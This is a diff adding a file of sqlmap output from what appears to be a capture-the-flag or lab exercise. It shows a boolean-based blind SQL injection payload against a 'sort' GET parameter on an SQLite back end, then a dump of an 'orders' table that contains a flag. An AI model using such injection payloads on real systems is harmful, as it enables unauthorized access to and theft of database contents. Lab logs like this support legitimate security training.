@@ -1,0 +1,33 @@
+sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:
+---
+Parameter: sort (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: sort=1 AND CASE WHEN 3071=3071 THEN 3071 ELSE JSON(CHAR(81,98,75,72)) END
+---
+back-end DBMS: SQLite
+<current>
+[1 table]
++--------+
+| orders |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: sort (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: sort=1 AND CASE WHEN 3071=3071 THEN 3071 ELSE JSON(CHAR(81,98,75,72)) END
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: orders
+[3 entries]
++----+-----+-------+------------------+
+| id | qty | sku   | note             |
++----+-----+-------+------------------+
+| 1  | 3   | alpha | flag{orderby_ok} |
+| 2  | 7   | beta  | nothing          |
+| 3  | 1   | gamma | x                |
++----+-----+-------+------------------+
+
